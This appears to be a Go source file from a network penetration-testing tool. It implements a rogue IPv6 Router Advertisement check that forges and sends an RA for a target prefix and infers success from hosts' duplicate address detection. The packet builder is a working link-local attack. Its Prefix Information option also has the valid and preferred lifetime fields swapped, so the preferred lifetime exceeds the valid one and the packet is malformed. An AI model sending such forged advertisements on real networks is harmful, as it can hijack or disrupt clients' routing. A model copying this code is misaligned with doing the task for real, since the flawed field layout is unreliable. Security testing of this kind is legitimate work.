// roguera.go implements the rogue router advertisement check. Impact
// temporary, restore decay with a 1800 s bound, affects clients: the
// Router Advertisement claims to be a router with a 1800 s router
// lifetime, so a host that takes it drops the route when that lifetime
// runs out, and nothing is restored by the run.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type rogueRAFinding struct {
	Action         string `json:"action"`
	RouterLifetime uint16 `json:"router_lifetime"`
	Prefix         string `json:"prefix"`
	DecayNote      string `json:"decay_note"`
}

// RunRogueRA sends one Router Advertisement for the target's IPv6 prefix
// from the attack leg's MAC and its EUI-64 link-local address, with the
// 1800 s router lifetime the catalog carries as the decay bound, and reads
// the attack leg. The preferred lifetime and flags are probe content. The
// predicate is a Neighbor Solicitation from another sender whose source is
// unspecified and whose target lies within the prefix: the duplicate
// address detection a host runs on an address it formed from the prefix
// (RFC 4862 section 5.5.3 item (d), section 5.4), which confirms; none
// within the window resists. An attack leg whose MAC is not six octets
// is a target error, since no link-local address derives from it.
func RunRogueRA(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldPrefix6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	prefix := deps.Target.Prefix6

	pkt, err := craftRogueRA(src, prefix)
	if err != nil {
		if check.IsTargetError(err) {
			return check.Verdict{}, err
		}
		return check.Verdict{}, errs.Wrap(err, "roguera: craft RA")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguera: send RA")
	}

	var formed net.IP
	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		target, ok := isDADSolicitIn(data, src, prefix)
		if ok {
			formed = target
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "roguera: receive solicitation")
	}

	detail, _ := json.Marshal(rogueRAFinding{
		Action:         "rogue-router-advertisement",
		RouterLifetime: 1800,
		Prefix:         prefix.String(),
		DecayNote:      "~1800s lifetime announced",
	})
	deps.Emitter.Finding("ra", detail)

	if found != nil {
		return check.Confirmed(fmt.Sprintf("a host formed %s in %s and ran duplicate address detection for it", formed, prefix), obs.Elapsed), nil
	}
	return check.Resisted(fmt.Sprintf("no host formed an address in %s within %s", prefix, obs.Elapsed.Round(time.Millisecond)), obs.Elapsed), nil
}

// craftRogueRA builds a Router Advertisement from the rogue router
// announcing prefix.
func craftRogueRA(src net.HardwareAddr, prefix *net.IPNet) ([]byte, error) {
	linkLocal, err := linkLocalFromMAC(src)
	if err != nil {
		return nil, err
	}
	prefixLen, _ := prefix.Mask.Size()

	eth := &layers.Ethernet{
		DstMAC:       allNodesMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      linkLocal,
		DstIP:      allNodesIPv6,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeRouterAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	// Prefix info option: the prefix, valid 1800s, preferred 1200s.
	prefixData := make([]byte, 30)
	prefixData[0] = byte(prefixLen)
	prefixData[1] = 0xC0                               // flags: L=1, A=1
	binary.BigEndian.PutUint32(prefixData[2:6], 1200)  // preferred
	binary.BigEndian.PutUint32(prefixData[6:10], 1800) // valid
	copy(prefixData[14:30], prefix.IP.To16())

	ra := &layers.ICMPv6RouterAdvertisement{
		HopLimit:       64,
		Flags:          0,
		RouterLifetime: 1800,
		ReachableTime:  0,
		RetransTimer:   0,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptPrefixInfo,
				Data: prefixData,
			},
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src,
			},
		},
	}
	return craft.Default(eth, ip, icmp, ra)
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6RouterAdvertisement)(nil)
